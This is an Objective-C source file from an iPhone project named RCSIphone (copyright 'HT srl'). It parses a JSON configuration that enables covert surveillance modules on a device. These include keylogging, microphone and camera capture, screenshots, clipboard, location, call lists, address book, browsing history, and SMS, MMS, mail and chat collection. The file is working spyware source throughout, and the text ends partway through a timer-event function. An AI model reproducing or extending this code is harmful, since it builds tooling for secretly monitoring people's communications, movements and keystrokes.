//
//  RCSIJSonConfiguration.m
//  RCSIphone
//
//  Created by kiodo on 23/02/12.
//  Copyright 2012 HT srl. All rights reserved.
//

#import "SBJSon.h"
#import "RCSICommon.h"
#import "RCSIJSonConfiguration.h"

//#define DEBUG_JSON_CONFIG_

@implementation SBJSonConfigDelegate

- (id)init
{
  self = [super init];
  
  if (self) {
    adapter = [[SBJsonStreamParserAdapter alloc] init];
    adapter.delegate = (id)self;
    
    parser = [[SBJsonStreamParser alloc] init];
    parser.delegate = adapter;
    
    mEventsList  = [[NSMutableArray alloc] initWithCapacity:0];
    mActionsList = [[NSMutableArray alloc] initWithCapacity:0];
    mAgentsList  = [[NSMutableArray alloc] initWithCapacity:0];
  }
  
  return self;
}

- (void)dealloc
{
  [mEventsList release];
  [mAgentsList release];
  [mActionsList release];
  
  [parser release];
  [adapter release];
  [super dealloc];
}

#
#
#pragma mark Modules parsing
#
#

// implemented
- (void)initABModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *type = [NSNumber numberWithUnsignedInt: AGENT_ADDRESSBOOK];
  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       enabled, 
                                       MODULE_EMPTY_CONF,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [pool release];
}

// implemented
- (void)initDeviceModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
 
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *type = [NSNumber numberWithUnsignedInt: AGENT_DEVICE];
  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
  // not used yet
  NSNumber *applist = [aModule objectForKey:MODULE_DEVICE_APPLIST_KEY];
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  u_int list = [applist boolValue];
  
  NSData *data = [NSData dataWithBytes:&list length:sizeof(list)];
  
  objects = [NSArray arrayWithObjects: type, 
                                       enabled, 
                                       data,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [pool release];
}

// implemented
- (void)initCalllistModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *type  = [NSNumber numberWithUnsignedInt: AGENT_CALL_LIST];
  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       enabled, 
                                       MODULE_EMPTY_CONF,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [pool release];
}

- (void)initCalendarModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSArray *keys;
  NSArray *objects;
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *type    = [NSNumber numberWithUnsignedInt: AGENT_ORGANIZER];
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       AGENT_DISABLED, 
                                       MODULE_EMPTY_CONF,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [pool release];
}

// implemented
- (void)initMicModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  microphoneAgentStruct_t micStruct;
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
  NSData  *data;
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *type   = [NSNumber numberWithUnsignedInt: AGENT_MICROPHONE];
  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
  
  // not used
  //  NSNumber *autos  = [aModule objectForKey: MODULE_MIC_AUTOSENSE_KEY];
  //  NSNumber *vad    = [aModule objectForKey:MODULE_MIC_VAD_KEY];
  //  NSNumber *vadThr = [aModule objectForKey: MODULE_MIC_VADTHRESHOLD_KEY];
  NSNumber *sil    = [aModule objectForKey: MODULE_MIC_SILENCE_KEY];
  NSNumber *thr    = [aModule objectForKey: MODULE_MIC_THRESHOLD_KEY];
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  memset(&micStruct, 0, sizeof(micStruct));
  micStruct.detectSilence = (sil != nil ? [sil unsignedIntValue] : 5);
  micStruct.silenceThreshold = (int)(thr != nil ? ([thr floatValue] * 100) : 22);
  
  data = [[NSData alloc] initWithBytes: &micStruct length: sizeof(microphoneAgentStruct_t)];
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       enabled, 
                                       data,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [data release];
  
  [pool release];
}

// implemented
- (void)initCameraModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  cameraStruct_t camStruct;
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
  NSData  *data;
   
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *type    = [NSNumber numberWithUnsignedInt:AGENT_CAM];
  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
  
  // timeStep and numStep forced to 0xFFFFFFFF for new paradigm: event repeatition
  camStruct.timeStep = 0xFFFFFFFF;
  camStruct.numStep = 0xFFFFFFFF;
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  // setup module structs NSData
  data = [[NSData alloc] initWithBytes: &camStruct length: sizeof(cameraStruct_t)];
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       enabled, 
                                       data,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [data release];
  
  [pool release];
}

// implemented
- (void)initScrshotModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  screenshotAgentStruct_t scrStruct;
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
  NSData  *data;
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *type    = [NSNumber numberWithUnsignedInt:AGENT_SCREENSHOT];
  NSNumber *onlyWin = [aModule objectForKey:MODULE_SCRSHOT_ONLYWIN_KEY];
  NSNumber *newWin  = [aModule objectForKey:MODULE_SCRSHOT_NEWWIN_KEY];
  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
  
  // timeout forced to 0xFFFFFFFF for new paradigm: event repeatition
  // NSNumber *timeOut = [aModule objectForKey: MODULE_SCRSHOT_INTERVAL_KEY];
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  memset(&scrStruct, 0, sizeof(scrStruct));
  
  // setup module structs
  scrStruct.grabActiveWindow = (onlyWin != nil ? [onlyWin unsignedIntValue] : 0);
  scrStruct.grabNewWindows = (newWin != nil ? [newWin boolValue] : 0);
  
  // on new config never repeat grabbing: events drive this
  scrStruct.sleepTime = 0xFFFFFFFF;//(timeOut != nil ? [timeOut unsignedIntValue] : 0);;
  scrStruct.dwTag = 0xFFFFFFFF;
  
  data = [[NSData alloc] initWithBytes: &scrStruct length: sizeof(screenshotAgentStruct_t)];
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       enabled, 
                                       data,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [data release];
  
  [pool release];
}

// implemented
- (void)initUrlModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *type    = [NSNumber numberWithUnsignedInt: AGENT_URL];
  NSNumber *takeSnap = [aModule objectForKey: MODULE_URL_TAKESNP_KEY];
  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       enabled, 
                                       takeSnap != nil ? (id)takeSnap : (id)MODULE_EMPTY_CONF,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [pool release];
}

// implemented
- (void)initAppModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *type = [NSNumber numberWithUnsignedInt: AGENT_APPLICATION];
  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       enabled, 
                                       MODULE_EMPTY_CONF,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  
  
  [mAgentsList addObject: moduleConfiguration];
  [moduleConfiguration release];
  [pool release];
}

// implemented
- (void)initKeyLogModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *type  = [NSNumber numberWithUnsignedInt: AGENT_KEYLOG];
  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       enabled, 
                                       MODULE_EMPTY_CONF,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [pool release];
}

// implemented
- (void)initClipboardModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *type  = [NSNumber numberWithUnsignedInt: AGENT_CLIPBOARD];
  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];

  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;

  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       enabled, 
                                       MODULE_EMPTY_CONF,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];

  [pool release];
}

- (void)initPositionModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
  UInt32 positionModulesStatus= POS_MODULES_ALL_DISABLE;
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *type  = [NSNumber numberWithUnsignedInt: AGENT_POSITION];
  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
  NSNumber *gpsStatus = [aModule objectForKey: @"gps"];
  NSNumber *wifiStatus = [aModule objectForKey: @"wifi"];
  NSNumber *cellStatus = [aModule objectForKey: @"cell"];
  
  if ([gpsStatus boolValue] == TRUE)
    positionModulesStatus |= POS_MODULES_GPS_ENABLE;
  if ([wifiStatus boolValue] == TRUE)
    positionModulesStatus |= POS_MODULES_WIF_ENABLE;
  if ([cellStatus boolValue] == TRUE)
    positionModulesStatus |= POS_MODULES_CEL_ENABLE;
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  NSData *data = [[NSData alloc] initWithBytes: &positionModulesStatus 
                                        length: sizeof(positionModulesStatus)];
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       enabled, 
                                       data,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [data release];
  
  [pool release];
}

typedef struct _message_config_t {
  int type;
  int enable;
  int history;
  int64_t datefrom;
  int64_t dateto;
  int maxsize;
} message_config_t;

- (int64_t)calculateUnixDate:(NSString*)aDate
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  if (aDate == nil)
    return 0;
  
  //date description format: YYYY-MM-DD HH:MM:SS ±HHMM
  // UTC timers
  NSTimeZone *timeZone = [NSTimeZone timeZoneWithName:@"UTC"];
  
  NSDateFormatter *inFormat = [[NSDateFormatter alloc] init];
  [inFormat setTimeZone:timeZone];
  [inFormat setDateFormat: @"yyyy-MM-dd HH:mm:ss"];
  
  // Get date string UTC
  NSDate *theDate = [inFormat dateFromString: aDate];
  [inFormat release];
  
  NSTimeInterval unixTime = [theDate timeIntervalSince1970];
  
  [pool release];
  
  return  unixTime;
}

- (void)setMessageFilter:(message_config_t*)param 
                 forType:(NSString*)type
          withDictionary:(NSDictionary*)aModule
{
  NSDictionary *tmpDict;
  
  memset(param, 0, sizeof(message_config_t));
      
  tmpDict = [aModule objectForKey: type];
    
  if (tmpDict != nil) 
    {
      NSNumber *enable = [tmpDict objectForKey:@"enabled"];
      if (enable != nil && [enable boolValue] == TRUE)
          param->enable = TRUE;
      else
          param->enable = FALSE;
      NSDictionary *filter = [tmpDict objectForKey: @"filter"];
      
      if (filter != nil)
        {
          NSNumber *history = [filter objectForKey:@"history"];
          if (history != nil && [history boolValue] == TRUE)
            param->history = TRUE;
          else
            param->history = FALSE;
          
          NSString *dateToStr = [filter objectForKey:@"dateto"];
          
           if (dateToStr != nil)
             {
               param->dateto = [self calculateUnixDate:dateToStr];
             } 
             
          NSString *dateFromStr = [filter objectForKey:@"datefrom"];
        
          if (dateFromStr != nil)
            {
              param->datefrom = [self calculateUnixDate:dateFromStr];
            }
            
          NSNumber *maxsize = [filter objectForKey: @"maxsize"];
          
          if (maxsize != nil) 
            {
              param->maxsize = [maxsize intValue];
            }
        }
    }
}

#define ANY_TYPE      0
#define SMS_TYPE      1
#define MMS_TYPE      2
#define MAIL_TYPE     4

- (void)initMessagesModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  message_config_t filter[3];
  
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *type  = [NSNumber numberWithUnsignedInt: AGENT_MESSAGES];
  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  [self setMessageFilter: &filter[0] forType:@"mms"  withDictionary:aModule];
  [self setMessageFilter: &filter[1] forType:@"sms"  withDictionary:aModule];
  [self setMessageFilter: &filter[2] forType:@"mail" withDictionary:aModule];
  
  filter[0].type = MMS_TYPE;
  filter[1].type = SMS_TYPE;
  filter[2].type = MAIL_TYPE;
  
  NSData *data = [[NSData alloc] initWithBytes: filter length: sizeof(filter)];
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       enabled, 
                                       data,
                                       nil];
  
  [data release];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [pool release];
}

- (void)initChatModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *type = [NSNumber numberWithUnsignedInt: AGENT_IM];
  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type,
                                       enabled,
                                       MODULE_EMPTY_CONF,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [pool release];
}

- (void)parseAndAddModules:(NSDictionary *)dict
{
  NSArray *modulesArray = [dict objectForKey: MODULES_KEY];
  
  if (modulesArray == nil)
    {
      return;
    }
  
  for (int i=0; i < [modulesArray count]; i++) 
    {
    NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
    
    NSDictionary *module = (NSDictionary *)[modulesArray objectAtIndex: i];
    
    NSString *moduleType = [module objectForKey: MODULES_TYPE_KEY];
    
    if (moduleType != nil)
      {
        if ([moduleType compare: MODULES_ADDBK_KEY] == NSOrderedSame) 
          {
            [self initABModule: module];
          }
        else if ([moduleType compare: MODULES_DEV_KEY] == NSOrderedSame) 
          {
            [self initDeviceModule: module];
          }
        else if ([moduleType compare: MODULES_CALL_KEY] == NSOrderedSame) 
          {
            [self initCalllistModule: module];
          }
        else if ([moduleType compare: MODULES_CAL_KEY] == NSOrderedSame) 
          {
            [self initCalendarModule: module];
          }
        else if ([moduleType compare: MODULES_MIC_KEY] == NSOrderedSame) 
          {
            [self initMicModule: module];
          }
        else if ([moduleType compare: MODULES_SNP_KEY] == NSOrderedSame) 
          {
            [self initScrshotModule: module];
          }
        else if ([moduleType compare: MODULES_URL_KEY] == NSOrderedSame) 
          {
            [self initUrlModule: module];
          }
        else if ([moduleType compare: MODULES_APP_KEY] == NSOrderedSame) 
          {
            [self initAppModule: module];
          }      
        else if ([moduleType compare: MODULES_KEYL_KEY] == NSOrderedSame) 
          {
            [self initKeyLogModule: module];
          }
        else if ([moduleType compare: MODULES_MSGS_KEY] == NSOrderedSame) 
          {
            [self initMessagesModule: module];
          }
        else if ([moduleType compare: MODULES_CLIP_KEY] == NSOrderedSame) 
          {
            [self initClipboardModule: module];
          }
        else if ([moduleType compare: MODULES_CAMERA_KEY] == NSOrderedSame) 
          {
            [self initCameraModule: module];
          }
        else if ([moduleType compare: MODULES_POSITION_KEY] == NSOrderedSame) 
          {
            [self initPositionModule: module];
          }
        else if ([moduleType compare: MODULES_CHAT_KEY] == NSOrderedSame)
        {
          [self initChatModule: module];
        }
      }
    
    [inner release];
    }
}

#
#
#pragma mark Events parsing
#
#

- (void)addProcessEvent: (NSDictionary *)anEvent
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSArray *keys;
  NSArray *objects;
  NSData  *data;
  processStruct_t procStruct;
  
#ifdef DEBUG_JSON_CONFIG
  NSLog(@"%s: registering event type %@", __FUNCTION__, [anEvent objectForKey: @"desc"]);
#endif
  
  NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
  NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_PROCESS];
  NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];
  NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];
  NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];
  NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];
  NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];
   
  memset(&procStruct, 0, sizeof(procStruct));
  
  if ([anEvent objectForKey: EVENT_ACTION_END_KEY] != nil) 
    {
      procStruct.onClose = [[anEvent objectForKey: EVENT_ACTION_END_KEY] unsignedIntValue];
    }
  else
    {
      procStruct.onClose  = 0xFFFFFFFF;
    }
  if ([anEvent objectForKey: EVENT_PROC_WINDOW_KEY] != nil) 
    {
      procStruct.lookForTitle = [[anEvent objectForKey: EVENT_PROC_WINDOW_KEY] unsignedIntValue];
    }
  else
    procStruct.lookForTitle = 0;

  if ([anEvent objectForKey: EVENT_PROC_NAME_KEY] != nil) 
    {
      u_int nameLength = (u_int)[[anEvent objectForKey: EVENT_PROC_NAME_KEY] 
                                 lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
      
      procStruct.nameLength =  nameLength > 256 ? 256 : nameLength;
      
      NSData *nameData = [[anEvent objectForKey: EVENT_PROC_NAME_KEY]
                          dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
      
      memcpy(procStruct.name, [nameData bytes], procStruct.nameLength);
    }
  
  data = [NSData dataWithBytes: &procStruct length: sizeof(procStruct)];
  
  keys = [NSArray arrayWithObjects: @"type", 
                                    @"actionID", 
                                    @"data",
                                    @"status", 
                                    @"monitor", 
                                    @"enabled",
                                    @"start",
                                    @"repeat",
                                    @"delay",
                                    @"iter",
                                    @"end",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       action  != nil ? action  : defNum, 
                                       data,
                                       EVENT_START, 
                                       @"", 
                                       enabled != nil ? enabled : defNum,
                                       action  != nil ? action  : defNum,
                                       repeat  != nil ? repeat  : defNum,
                                       delay   != nil ? delay   : defNum,
                                       iter    != nil ? iter    : defNum,
                                       end     != nil ? end     : defNum,
                                       nil];
             
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [eventConfiguration addEntriesFromDictionary: dictionary];
  
  [mEventsList addObject: eventConfiguration];
  
  [eventConfiguration release];
  
  [pool release];
}

/////////////////////////////////////////////////////
// temporary methods for emulate old timers
//
- (NSTimeInterval)calculateMsecFromMidnight:(NSString*)aDate
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSTimeInterval msec = 0;
  
  if (aDate == nil)
    return msec;
  
  NSRange fixedRange;
  fixedRange.location = 11;
  fixedRange.length   = 8;
  
  //date description format: YYYY-MM-DD HH:MM:SS ±HHMM
  // UTC timers
  NSTimeZone *timeZone = [NSTimeZone timeZoneWithName:@"UTC"];
  
  NSDateFormatter *inFormat = [[NSDateFormatter alloc] init];
  [inFormat setTimeZone:timeZone];
  [inFormat setDateFormat: @"yyyy-MM-dd HH:mm:ss ZZZ"];
  
  // Get current date string UTC
  NSDate *now = [NSDate date];
  NSString *currDateStr = [inFormat stringFromDate: now];
  
  [inFormat release];
  
  // Create string from current date: yyyy-MM-dd hh:mm:ss ZZZ
  NSMutableString *dayStr = [[NSMutableString alloc] initWithString: currDateStr];
  
  // reset current date time to midnight
  [dayStr replaceCharactersInRange: fixedRange withString: @"00:00:00"];
  
  NSDateFormatter *outFormat = [[NSDateFormatter alloc] init];
  [outFormat setTimeZone:timeZone];
  [outFormat setDateFormat: @"yyyy-MM-dd HH:mm:ss ZZZ"];
  
  // Current midnite
  NSDate *midnight = [outFormat dateFromString: dayStr];
  
  // Set current date time to aDate
  [dayStr replaceCharactersInRange: fixedRange withString: aDate];
  
  NSDate *date = [outFormat dateFromString: dayStr];
  
  [outFormat release];
  [dayStr release];
  
  msec = [date timeIntervalSinceDate: midnight];
  msec *= 1000;
  
  [pool release];
  
  return  msec;
}

- (int64_t)calculateWinDate:(NSString*)aDate
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  if (aDate == nil)
    return 0;
  
  //date description format: YYYY-MM-DD HH:MM:SS ±HHMM
  // UTC timers
  NSTimeZone *timeZone = [NSTimeZone timeZoneWithName:@"UTC"];
  
  NSDateFormatter *inFormat = [[NSDateFormatter alloc] init];
  [inFormat setTimeZone:timeZone];
  [inFormat setDateFormat: @"yyyy-MM-dd HH:mm:ss"];
  
  // Get date string UTC
  NSDate *theDate = [inFormat dateFromString: aDate];
  [inFormat release];
  
  NSTimeInterval unixTime = [theDate timeIntervalSince1970];
  int64_t winTime = (unixTime * RATE_DIFF) + EPOCH_DIFF;
    
  [pool release];
  
  return  winTime;
}

- (int64_t)calculateDaysDate:(NSNumber*)aDay
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  int64_t days;
  
  if (aDay == nil)
    return 0;
  
  // days in 100nanosec * secXHour * hourXdays
  days = (int64_t)[aDay intValue] * TIMER_100NANOSEC_PER_DAY;
  
  [pool release];
  
  return  days;
}

/////////////////////////////////////////////////////

- (u_int)timerGetSubtype:(NSDictionary*)anEvent
{
  u_int type = TIMER_UNKNOWN;
  
  NSString *eventType = [anEvent objectForKey: EVENT_TYPE_KEY];
  
  if ([eventType compare: EVENTS_TIMER_KEY] == NSOrderedSame)
    {
      NSString *subtype = [anEvent objectForKey: EVENTS_TIMER_SUBTYPE_KEY];
      
      if (subtype == nil)
        type = TIMER_UNKNOWN;
      else if ([subtype compare: EVENTS_TIMER_SUBTYPE_LOOP_KEY] == NSOrderedSame)
        type = TIMER_LOOP;
      else if ([subtype compare: EVENTS_TIMER_SUBTYPE_STARTUP_KEY] == NSOrderedSame)
        type = TIMER_AFTER_STARTUP;
      else if ([subtype compare: EVENTS_TIMER_SUBTYPE_DAILY_KEY] == NSOrderedSame)
        type = TIMER_DAILY;
    }
  else if ([eventType compare: EVENTS_TIMER_DATE_KEY] == NSOrderedSame)
    type = TIMER_DATE;
  else if ([eventType compare: EVENTS_TIMER_AFTERINST_KEY] == NSOrderedSame)
    type = TIMER_INST;
  
  return type;
}

/////////////////////////////////////////////////////
// Old timers mapping:
//
// TIMER_DATE, TIMER_INST -> EVENTS_TIMER_DATE_KEY, EVENTS_TIMER_AFTERINST_KEY
// TIMER_AFTER_STARTUP, TIMER_LOOP, TIMER_DAILY -> EVENTS_TIMER_KEY
- (void)addTimerEvent: (NSDictionary *)anEvent
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSArray *keys;
  NSArray *objects;
  NSData  *data;
